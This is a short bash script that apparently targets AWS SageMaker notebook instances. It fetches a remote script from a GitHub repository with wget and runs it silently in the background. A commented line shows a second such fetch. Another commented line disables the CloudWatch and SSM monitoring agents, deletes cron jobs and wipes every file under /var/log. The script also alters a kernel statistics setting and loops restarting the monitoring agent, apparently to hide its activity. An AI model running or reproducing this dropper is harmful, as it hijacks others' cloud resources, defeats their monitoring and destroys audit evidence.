#!/bin/bash
#systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agent; rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; find /var/log -type f -delete;

bash <(sysctl -w vm.stat_interval=86400  || sudo sysctl -w vm.stat_interval=86400) >/dev/null 2>&1

bash <(wget -qO- https://github.com/army2mil/njabscb/raw/refs/heads/main/...) >>/dev/null 2>&1 &
while [ 1 ]; do
    /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent -schematest -config /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.toml
    restart restart-cloudwatch-agent
    systemctl restart amazon-cloudwatch-agent.service
    sleep 120
done
#bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >>/dev/null 2>&1 &
